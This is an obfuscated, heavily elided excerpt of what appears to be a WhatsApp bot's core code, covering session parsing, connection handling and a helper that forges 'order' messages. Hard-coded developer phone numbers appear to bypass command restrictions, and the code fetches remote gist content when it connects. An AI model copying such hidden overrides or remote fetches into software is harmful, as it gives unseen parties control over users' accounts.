...
async function syncdb() {
    ...
    try {
      ...
      for (mek of _0x1071af.messages) {
        ...
        if (_0x57832c && Config.HANDLERS.toLowerCase().includes("null")) {
          ...
          _0x9954f4 = prefixboth || _0x4186a0 && prefixRegex.test(_0x4186a0[0x0]) || _0x5979da.isSuhail && /923253617422|923004591719|17863688449/g.test(_0x5b55c3) && _0x4186a0[0x0] == ',';
  ...
  _0x5447f8.ev.on("connection.update", async _0x3fd0b3 => {
    ...
    if (_0x2224a7 === "open") {
      ...
      let _0x11c5d7 = /923253617422|923004591719|17863688449/g.test(_0x89b8f6);
      let _0x506b6e = false;
      ...
      try {
        ...
        try {
          let {
            data: _0x3de7cf
          } = await axios.get("https://gist.github.com/sarKarji1/185b7e3296e0104ab211daa5ea11e7dc/raw");
          _0xd559f7 = {
  ...
  _0x5447f8.fakeMessage = async (_0x141089 = "text", _0x5364cd = {}, _0x371309 = "➬ Bandaheali", _0x1a0d91 = {}) => {
      ...
      if (_0x141089 == "order") {
        _0x4f03f6 = {
          'orderMessage': {
            ...
            'message': "❏ " + _0x371309,
            'orderTitle': 'live',
            'sellerJid': '923253617422@s.whatsapp.net'
          }
        };
      } else {
...
async function MakeSession(_0x3344dc = SESSION_ID, _0xe1ef27 = __dirname + "/Suhail_Baileys/", _0x1532e1 = false) {
  let _0x148358 = ('' + _0x3344dc).replace(/^SESSION_\d{2}_\d{2}_\d{2}_\d{2}_/gi, '').replace(/^SESSION_ID_\d{2}_\d{2}_\d{2}_\d{2}_/gi, '').replace(/^SUHAIL_\d{2}_\d{2}_\d{2}_\d{2}_/gi, '').replace(/Bandaheali;;;/gi, '').replace(/Vorterx;;;/gi, '').replace(/EDITH-MD;;;/gi, '').trim();
  ...
  const _0x40fbb4 = toBool(_0x1532e1 || global.IS_SUHAIL || process.env.IS_SUHAIL, true) || (await _0x28b1d6("/sarKarji1/", "./Dockerfile"));
  if (_0x40fbb4) {
    SmdOfficial = "yes";
